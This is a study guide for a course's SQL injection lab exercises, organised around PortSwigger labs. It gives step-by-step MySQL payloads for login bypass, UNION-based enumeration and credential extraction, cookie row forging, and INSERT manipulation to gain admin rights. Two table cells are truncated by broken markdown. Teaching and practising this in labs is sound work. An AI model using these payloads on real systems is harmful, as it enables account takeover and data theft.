# Manual SQL injection study guide for the Server Exploitation exercises

This guide assumes Burp Suite Repeater and manual reasoning. It does not use
SQLmap, Burp Scanner, or automated extraction.

Seven SQL injection exercises:

1. Welcome
2. Welcome Final
3. Search
4. Search All
5. Unsubscribe
6. Welcome Back
7. You Are All Welcome

PortSwigger covers the common `WHERE`, login bypass, `UNION`, schema discovery,
cookie, and filter-bypass ideas. The course adds several details that need extra
practice:

- MySQL URL-encoded payloads and MySQL comment syntax
- balancing quotes when a comment is filtered
- `AND` and `OR` precedence
- MySQL `CONCAT()`, `GROUP_CONCAT()`, and quoted identifiers
- manual replacement of SQLmap's table discovery
- forging a row with `UNION` in an authentication cookie
- PHP array-key injection into an `INSERT` statement

## PortSwigger lab key

Complete these labs in this order. Do each lab manually in Repeater.

| ID    | Exact PortSwigger lab name                                                                                                                                                                                    | What it teaches                                                                     |
| ----- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------- |
| PS-01 | [SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)                                                   | Closing a quoted string, changing a`WHERE` condition, and commenting out the rest |
| PS-02 | [SQL injection vulnerability allowing login bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass)                                                                                       | Removing or bypassing the password condition in a login query                       |
| PS-03 | [SQL injection UNION attack, determining the number of columns returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)                        | Matching the original query's column count with`UNION SELECT NULL`                |
| PS-04 | [SQL injection UNION attack, finding a column containing text](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)                                               | Finding which returned columns accept and display text                              |
| PS-05 | [SQL injection UNION attack, retrieving data from other tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)                                          | Selecting useful columns from another table                                         |
| PS-06 | [SQL injection UNION attack, retrieving multiple values in a single column](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)                    | Combining several values into one displayed column                                  |
| PS-07 | [SQL injection attack, querying the database type and version on MySQL and Microsoft](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft) | Recognizing MySQL and choosing database-specific syntax                             |
| PS-08 | [SQL injection attack, listing the database contents on non-Oracle databases](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)              | Enumerating tables and columns through`information_schema`                        |
| PS-09 | [Blind SQL injection with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)                                                                           | Editing a cookie and comparing responses for true and false conditions              |
| PS-10 | [SQL injection with filter bypass via XML encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)                                                  | Separating transport encoding from the SQL that reaches the database                |

PS-10 uses XML rather than a form body. Its useful lesson for this course is
that a filter and the database may see different representations of the same
input. It does not directly teach the course's URL-encoding problem.

## Exercise-to-lab table

| Course exercise        | PortSwigger labs to finish first  | Skills transferred from those labs                                                                  | Course-specific gaps covered later in this guide                                                                  |
| ---------------------- | --------------------------------- | --------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------- |
| 1. Welcome             | PS-01, PS-02                      | quoted-string injection, true conditions, login bypass, comments                                    | MySQL`-- ` comment rule and choosing which login field to test                                                  |
| 2. Welcome Final       | PS-01, PS-02, PS-10               | login-query reasoning and filter-bypass thinking                                                    | percent encoding,`#`, MySQL `                                                                                   |
| 3. Search              | PS-03, PS-04, PS-05, PS-07, PS-08 | column count, text-compatible columns, other-table retrieval, MySQL recognition, schema enumeration | suppressing original rows,`database()`, `GROUP_CONCAT()`, and MySQL URL encoding                              |
| 4. Search All          | PS-05, PS-06, PS-07, PS-08        | schema enumeration, cross-table retrieval, combining output                                         | reserved identifiers such as`order`, output labels, and handling long or ambiguous concatenated results         |
| 5. Unsubscribe         | PS-01, PS-02, PS-10               | query reconstruction, comments, and filter-layer reasoning                                          | PHP bracket parameters, attacker-controlled column names, and reshaping an`INSERT` query                        |
| 6. Welcome Back        | PS-03 through PS-09               | manual`UNION`, schema enumeration, cookie injection, and conditional comparisons                  | replacing SQLmap manually, determining the cookie query's output shape, and forging a row the application accepts |
| 7. You Are All Welcome | PS-02, PS-09                      | authentication logic and cookie-based boolean injection                                             | `AND` before `OR`, preserving a valid second cookie, and balancing the application's closing quote            |

## The mental model

SQL injection has two separate layers:

1. HTTP transports characters to the application.
2. The application places the decoded value into an SQL statement.

A payload can be correct SQL and still fail at the HTTP layer. A request can
also arrive intact and fail because the payload does not fit the SQL context.
Always reason about both representations.

Suppose a login handler builds this query:

```sql
SELECT id, username, password
FROM users
WHERE username = '<USERNAME>' AND password = '<PASSWORD>';
```

The application supplies the surrounding quotes. If `<USERNAME>` contains:

```text
alice' OR 1=1--
```

the database receives something like:

```sql
SELECT id, username, password
FROM users
WHERE username = 'alice' OR 1=1-- ' AND password = 'anything';
```

The apostrophe closes the username string. `OR 1=1` changes the condition. The
MySQL comment removes the unmatched quote and password test. The space after
`--` matters in MySQL.

Do not memorize that string as a universal password. It only makes sense if the
input appears inside a quoted `WHERE` condition and the application accepts that
comment form.

## Minimal Repeater workflow

Send an ordinary request to Repeater. Change one parameter or cookie and start
with an apostrophe. If the response changes, confirm SQL evaluation with a true
and false pair:

```text
test' AND '1'='1
test' AND '1'='2
```

If the true case behaves normally and the false case does not, reconstruct the
query around the input. Then use boolean logic for a login, `UNION` for returned
data, or identifier and `INSERT` manipulation for the newsletter exercise.

## Form and URL encoding

The course uses `application/x-www-form-urlencoded` requests. In this format,
`&` separates parameters and `=` separates a name from its value. A literal
character that might change the form structure should be percent-encoded.

| Decoded character | Encoded form     | Why it matters here                                                     |
| ----------------- | ---------------- | ----------------------------------------------------------------------- |
| `'`             | `%27`          | closes an SQL string                                                    |
| space             | `%20` or `+` | separates SQL tokens                                                    |
| `#`             | `%23`          | starts a MySQL comment; in a URL it otherwise begins a browser fragment |
| vertical bar      | `%7C`          | two vertical bars may act as MySQL`OR` under the default SQL mode     |
| backtick          | `%60`          | quotes a MySQL identifier                                               |
| `(`             | `%28`          | starts a function or value list                                         |
| `)`             | `%29`          | closes a function or value list                                         |
| `,`             | `%2C`          | separates columns or values                                             |
| `[`             | `%5B`          | opens a PHP bracket parameter key                                       |
| `]`             | `%5D`          | closes a PHP bracket parameter key                                      |
| `+`             | `%2B`          | preserves a literal plus; raw`+` normally decodes to a space          |

Keep the decoded payload beside its encoded form. Encode the parameter value
once before sending, then inspect the raw request. If the body contains
`%2527`, the percent sign itself was encoded and the request now contains a
double-encoded apostrophe. That only works if the application decodes twice.

When testing a filter, compare these stages:

```text
Characters typed in Repeater
        |
        v
Bytes in the raw HTTP request
        |
        v
Value after form or URL decoding
        |
        v
Value after application normalization or filtering
        |
        v
SQL text parsed by MySQL
```

A URL-encoded keyword does not stay encoded in SQL. The web framework normally
decodes it before the database sees it.

## MySQL syntax needed by the course

### Comments

MySQL recognizes these relevant comment forms:

```sql
# comment to end of line
-- comment to end of line
/* block comment */
```

`--` must be followed by whitespace or a control character. This works:

```text
'--
```

This often fails:

```text
'--x
```

Encode `#` as `%23` when it appears in a URL or form value. Otherwise, a browser
may treat it as a fragment and never send it to the server.

### `OR`, `AND`, and `||`

MySQL evaluates `AND` before `OR`:

```sql
A OR B AND C
```

means:

```sql
A OR (B AND C)
```

This can bypass a password check without a comment. Consider:

```sql
WHERE username = '<COOKIE_NAME>' AND password = '<COOKIE_HASH>'
```

If the username cookie becomes:

```text
victim' OR username='victim
```

the application may build:

```sql
WHERE username = 'victim'
   OR username = 'victim' AND password = '<COOKIE_HASH>'
```

The first branch can select the victim independently of the password branch.
The final quote supplied by the application closes the second `victim` string.
This works only if the reconstructed query is balanced exactly as shown.

Under MySQL's usual SQL mode, `||` is another spelling of boolean `OR`. The
`PIPES_AS_CONCAT` SQL mode changes its meaning to string concatenation. Confirm
behavior with a true and false pair rather than assuming the server's mode.

### Strings and identifiers

Single quotes delimit string values:

```sql
'alice'
```

Backticks quote identifiers such as table and column names:

```sql
SELECT `order`, code FROM launch_records;
```

Use backticks when a discovered identifier is also an SQL keyword or contains
unusual characters. Do not wrap a column name in single quotes. `'order'`
returns the literal word `order`, not the column's values.

### Useful MySQL functions

```sql
database()
@@version
CONCAT(username, ':', password)
CONCAT_WS(':', username, password)
GROUP_CONCAT(table_name SEPARATOR ',')
```

`CONCAT()` combines expressions. `CONCAT_WS()` adds the chosen separator and is
easier to read when one field may be `NULL`. `GROUP_CONCAT()` combines values
from several rows into one output cell. The server can truncate a long
`GROUP_CONCAT()` result, so absence from a long list is not proof that an object
does not exist.

## Manual `UNION` method

Use `UNION` only when the application returns query results or uses the returned
row in a visible decision such as authentication.

### Step 1. Suppress the original rows

If the vulnerable value appears in a quoted `WHERE` condition, start with an
always-false condition:

```text
' AND 1=2
```

This makes injected rows easier to recognize. An ordinary search result cannot
be mistaken for your `UNION` output.

### Step 2. Determine the column count

Try one `NULL`, then two, then three:

```text
' AND 1=2 UNION ALL SELECT NULL-- -
' AND 1=2 UNION ALL SELECT NULL,NULL-- -
' AND 1=2 UNION ALL SELECT NULL,NULL,NULL-- -
```

The first count that stops producing the column-count error is a candidate.
Confirm it twice. `NULL` is safer than `1,2,3` because it can convert to most
column types.

An alternative is `ORDER BY`:

```text
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
```

The first index that produces an out-of-range response reveals that the query
has fewer columns than that index. `ORDER BY` can be easier when `UNION NULL`
creates application errors unrelated to the database.

### Step 3. Find text-compatible and visible columns

For a three-column query, move a marker through one position at a time:

```text
' AND 1=2 UNION ALL SELECT 'qz1',NULL,NULL-- -
' AND 1=2 UNION ALL SELECT NULL,'qz2',NULL-- -
' AND 1=2 UNION ALL SELECT NULL,NULL,'qz3'-- -
```

Record two separate facts:

- whether MySQL accepts text in the column
- whether the application displays or uses that column

A column may accept text but never appear in the HTML. An authentication handler
may use a returned value without printing it.

### Step 4. Identify the database

Place one expression in a known text-compatible position:

```sql
@@version
database()
```

Fill the other positions with `NULL`. For example, if the second of three
columns is visible:

```text
' AND 1=2 UNION ALL SELECT NULL,@@version,NULL--
```

Do not copy that shape unless you have already proved that the original query
returns three columns and that column two accepts text.

### Step 5. Enumerate tables

For MySQL, the current database's table names are available through:

```sql
SELECT table_name
FROM information_schema.tables
WHERE table_schema = database();
```

If only one output cell is visible, combine the names:

```sql
SELECT GROUP_CONCAT(table_name SEPARATOR ',')
FROM information_schema.tables
WHERE table_schema = database();
```

Inserted into a two-column `UNION` whose second column displays text, the shape
would be:

```text
' AND 1=2 UNION ALL
  SELECT NULL,GROUP_CONCAT(table_name SEPARATOR ',')
  FROM information_schema.tables
  WHERE table_schema=database()--
```

Remove the line breaks before sending if the target or filter treats them
differently. Ordinary spaces preserve the SQL meaning here.

### Step 6. Enumerate columns

After choosing a table from the returned list:

```sql
SELECT GROUP_CONCAT(column_name ORDER BY ordinal_position SEPARATOR ',')
FROM information_schema.columns
WHERE table_schema = database()
  AND table_name = '<TABLE_NAME>';
```

Filter by both schema and table name. The same table name may exist in several
schemas.

### Step 7. Retrieve the rows

If two displayed columns accept text:

```sql
SELECT username, password FROM `<TABLE_NAME>`;
```

If only one displayed column accepts text:

```sql
SELECT CONCAT_WS(':', username, password)
FROM `<TABLE_NAME>`;
```

Use a separator that cannot be confused with the data. Hexadecimal separators
avoid quote problems:

```sql
CONCAT(username,0x3a,password)
```

`0x3a` is a colon in MySQL.

If the application shows only one injected row, retrieve one row at a time:

```sql
SELECT CONCAT_WS(':', username, password)
FROM `<TABLE_NAME>`
LIMIT 0,1;
```

Then change the offset to `1,1`, `2,1`, and so on. Stop when a request produces
no injected row. This is slower than SQLmap, but every step remains explainable.

## Manual replacement for SQLmap in Welcome Back

The supplied walkthrough uses SQLmap for discovery, then uses a manual cookie
`UNION` to finish. Replace the automated portion with this sequence:

1. Capture the login request and the following remembered-login `GET` request.
2. Preserve both cookies and change only one cookie at a time.
3. Test an apostrophe, then matched true and false conditions.
4. Use `UNION SELECT NULL` to determine the cookie query's column count.
5. Move a text marker through the columns.
6. Query `database()` and `@@version` in a usable column.
7. Enumerate tables through `information_schema.tables`.
8. Enumerate the chosen account table through `information_schema.columns`.
9. Retrieve the needed account fields with two text columns or `CONCAT_WS()`.
10. Construct a `UNION` row whose column order matches what the authentication
    code expects.

The last step is more than data extraction. If the application fetches:

```sql
SELECT id, username, password FROM users WHERE ...
```

then the injected row must have compatible values in those positions:

```sql
UNION ALL SELECT NULL,'<USERNAME>','<STORED_HASH>'
```

If the order is `username,password,id`, the same injected row must use a
different order. A successful three-column test does not tell you which column
means username. Use displayed markers, leaked query text, or controlled response
changes to infer the order.

### Cookie handling in Repeater

Cookies are separated by semicolons:

```http
Cookie: name_one=value_one; name_two=value_two
```

Keep the untouched cookie exactly as the application issued it. Put the SQL
fragment only in the cookie under test. Do not add a semicolon inside the value,
because it starts another cookie. Cookie values are not automatically form
decoded in the same way as POST bodies. Test raw and encoded forms separately
to determine which representation the application uses.

Use the response body, redirect, and new cookies as separate signals. A `200 OK`
status does not prove login success.

## Filtered login injection and balanced quotes

When a comment works, it is convenient because it removes the rest of the
query. When comments are blocked, make the remaining query valid instead.

Start by writing the assumed template:

```sql
SELECT * FROM users
WHERE username = '<INPUT>' AND password = '<PASSWORD>';
```

Now place a balanced expression into `<INPUT>`:

```text
' OR 1=1 OR '
```

The resulting shape may be:

```sql
WHERE username = '' OR 1=1 OR '' AND password = '<PASSWORD>'
```

Because `AND` binds more tightly than `OR`, the condition groups as:

```sql
username = '' OR 1=1 OR ('' AND password = '<PASSWORD>')
```

The middle branch is true. Both quotes supplied by the application are still
paired, so no comment is needed.

This pattern depends on the exact query. If the input is already numeric, is
wrapped in parentheses, or passes through a `LIKE '%...%'` expression, the
required prefix and suffix will differ. Reconstruct before sending.

### A controlled filter test matrix

Change one feature per request:

| Test                           | Question answered                                       |
| ------------------------------ | ------------------------------------------------------- |
| raw apostrophe                 | Does the filter or query react to`'`?                 |
| `%27`                        | Does decoding occur after an earlier character filter?  |
| `OR` versus `                |                                                         |
| `-- ` versus `%23`         | Is one MySQL comment form blocked?                      |
| comment versus balanced quotes | Can valid syntax be built without truncating the query? |
| true versus false condition    | Did MySQL evaluate the expression?                      |

Do not interpret one failed payload as proof that injection was fixed. It may
only prove that one representation or one comment form was rejected.

## PHP bracket parameters and `INSERT` injection

This is the largest PortSwigger gap in the course.

### What PHP bracket notation means

A form body such as:

```text
fields[email]=student@example.invalid&fields[nickname]=learner
```

can become an associative PHP array conceptually equivalent to:

```text
fields = {
  email: student@example.invalid,
  nickname: learner
}
```

The application may build an `INSERT` by treating array keys as column names
and array values as inserted values. Unsafe code can create this shape:

```sql
INSERT INTO emailist (email,nickname,is_admin,password)
VALUES ('student@example.invalid','learner','0','generated-secret');
```

Validating the email value does not protect the query if the attacker controls
another array key that becomes raw SQL.

### Why an ordinary quote in the value may fail

The injection point may be an identifier, not a quoted string value:

```sql
INSERT INTO emailist (email,<ARRAY_KEY>,is_admin,password)
```

Apostrophe tests target string syntax. An identifier context may react to a
backtick, comma, or closing parenthesis instead. PortSwigger's common login labs
mostly place input inside a `WHERE` string, so this feels unfamiliar at first.

### Safe discovery sequence for the disposable lab

1. Submit one normal registration and save the exact request.
2. Add a second `fields[...]` member with a harmless new key and value.
3. Change only that key with one delimiter such as a backtick.
4. If the application reveals a query, copy it exactly.
5. Mark the characters supplied by the application and those supplied by you.
6. Count the original columns and values.
7. Design a replacement ending that closes the column list, supplies the same
   number of values, and comments out the application's original suffix.
8. Percent-encode the malicious bracket key so its commas, parentheses, quotes,
   spaces, and comment character remain inside that parameter name.
9. Send once and verify the created record through the application's intended
   lab workflow.

Use fictional data such as `student@example.invalid` and a new password used
only in the disposable lab.

### How the query surgery works

Assume the application constructs:

```sql
INSERT INTO emailist (email,<KEY>,is_admin,password)
VALUES ('student@example.invalid','<VALUE>','0','random');
```

An attacker-controlled key can conceptually supply:

```sql
is_admin,password) VALUES ('student@example.invalid','1','lab-only-secret')#
```

The database then sees this effective statement:

```sql
INSERT INTO emailist (email,is_admin,password)
VALUES ('student@example.invalid','1','lab-only-secret')# remainder ignored
```

This is not a stacked query. It reshapes the application's single `INSERT`
statement. There is no semicolon and no second SQL statement.

In an HTTP body, the bracket key must remain one parameter name. Its general
shape is:

```text
fields%5B<URL-ENCODED-SQL-KEY>%5D=x
```

Do not copy the conceptual fragment blindly. Rebuild it from the exact query
leaked by the course instance. Backticks, existing parentheses, column order,
and the number of generated values determine the required syntax.

### Failure diagnosis

| Result                                         | Likely meaning                                                                            |
| ---------------------------------------------- | ----------------------------------------------------------------------------------------- |
| email validation error before any SQL error    | the application rejected a required value before building the query                       |
| unknown-column error                           | the key reached an identifier position, but the identifier or quoting is wrong            |
| column-count/value-count mismatch              | the replacement column list and`VALUES` list have different lengths                     |
| syntax error near`VALUES`                    | a parenthesis or delimiter closed at the wrong place                                      |
| normal account created with generated password | the injected key did not alter the effective column list, or the suffix was not commented |
| request arrives as two parameters              | an`&`, `=`, `[` or `]` inside the malicious name was encoded incorrectly          |

Because this technique changes stored data, make one controlled attempt after
the query balances on paper. Repeated guessing leaves junk records and makes
later results harder to interpret.

## Exercise playbooks

These playbooks give the method without copying the completed walkthrough's
final identities, secrets, or extracted values.

### Exercise 1: Welcome

1. Capture one failed login.
2. Test the username and password fields separately with an apostrophe.
3. Use the error to reconstruct the quoted login query.
4. Confirm the vulnerable field with true and false conditions.
5. Build a true branch and use a valid MySQL comment to remove the remaining
   password condition.
6. Verify success from the application message, not from HTTP status alone.

### Exercise 2: Welcome Final

1. Repeat the baseline and apostrophe tests.
2. Compare raw `'` with `%27` in the raw request.
3. Test `OR` and `||` with otherwise identical true and false conditions.
4. Test `-- ` and `%23` separately.
5. If comments fail, rebuild the expression so the application's closing quote
   completes the payload.
6. Decode the final body and prove that every quote is paired.

### Exercise 3: Search

1. Test each search field separately. Keep the other field ordinary.
2. Confirm the vulnerable field with a true and false pair.
3. Suppress original rows with an always-false condition.
4. Determine the `UNION` column count.
5. Find text-compatible, visible columns.
6. Query `database()` and enumerate current-schema tables.
7. Enumerate columns for each plausible account table.
8. Retrieve only the requested fields and preserve row boundaries with two
   displayed columns or a clear separator.

### Exercise 4: Search All

1. Reuse the proved injection point and column shape from Exercise 3.
2. Enumerate all current-schema tables and their columns.
3. Classify names as ordinary application data or suspicious course data.
4. Quote reserved identifiers with backticks.
5. Label combined output with `CONCAT()` so values cannot be confused.
6. Record why the table is suspicious based on its role and contents, not only
   its name.

### Exercise 5: Unsubscribe

1. Capture normal subscription and removal requests.
2. Identify the `fields[...]` parameter and treat its key and value as separate
   possible injection points.
3. Add a second controlled array member and trigger one identifier syntax error.
4. Reconstruct the leaked `INSERT` statement.
5. Reshape the column and value lists using the method above.
6. Verify the intended administrative account or role through the lab UI.
7. Use the management function only for the record named in the exercise.

### Exercise 6: Welcome Back

1. Capture the login POST and the remembered-login GET.
2. Inventory all cookies created when remember-me is selected.
3. Test each cookie independently.
4. Apply the manual SQLmap replacement sequence.
5. Determine the returned row's column count, compatible types, and semantic
   order.
6. Retrieve the account record needed by the exercise.
7. Forge a compatible `UNION` row in the vulnerable cookie.
8. Confirm the named login result in a fresh response.

### Exercise 7: You Are All Welcome

1. Log in with the supplied starter account and preserve both remember-me
   cookies.
2. Change only the username cookie while retaining the valid hash cookie.
3. Confirm the injection point with a quote and matched boolean conditions.
4. Write the complete assumed `WHERE` clause.
5. Use `AND` precedence to separate a target-username branch from the hash
   branch.
6. Balance the final quote instead of assuming a comment will work.
7. Confirm the target identity from the response.

## Troubleshooting table

| Symptom                                       | Check next                                                                                                        |
| --------------------------------------------- | ----------------------------------------------------------------------------------------------------------------- |
| apostrophe has no effect                      | wrong parameter, application validation, encoding layer, numeric context, or escaped quote                        |
| true and false conditions look identical      | unstable baseline, condition outside SQL, response signal not visible, or wrong closing syntax                    |
| every`UNION` count errors                   | wrong injection context, comment failure, original rows not suppressed, or application rejects`NULL`            |
| correct column count but marker never appears | columns accept the value but the application does not render them; try other positions or another response signal |
| `#` payload is cut off in a browser URL     | encode it as`%23`                                                                                               |
| raw`+` changes the SQL                      | form decoding changed it to a space; use`%2B` for a literal plus                                                |
| cookie edit disappears                        | a redirect or`Set-Cookie` replaced it; resend from Repeater and inspect every response                          |
| schema list appears incomplete                | `GROUP_CONCAT()` truncation, wrong schema filter, or only the first result rendered                             |
| authentication`UNION` returns an error      | column count, type, or semantic order does not match what the application expects                                 |
| HTTP 200 but the exercise is unsolved         | the application returned its normal error page; inspect the body and login state                                  |

## Readiness test

You are ready to attempt the seven exercises without SQLmap when you can do all
of the following without reading a solution:

- explain the HTTP and decoded SQL form of a payload
- confirm an injection with matched true and false requests
- reconstruct a quoted login `WHERE` clause
- use both a MySQL comment and a balanced-quote alternative
- determine a `UNION` column count with `NULL`
- locate a text-compatible visible column
- enumerate MySQL tables and columns through `information_schema`
- retrieve two fields through two columns and through one concatenated column
- distinguish string literals from backtick-quoted identifiers
- inject and debug a cookie without altering the neighboring cookie
- explain why `A OR B AND C` means `A OR (B AND C)`
- reconstruct an `INSERT` query from an error and balance its columns and values
- state the application-level signal that proves each result
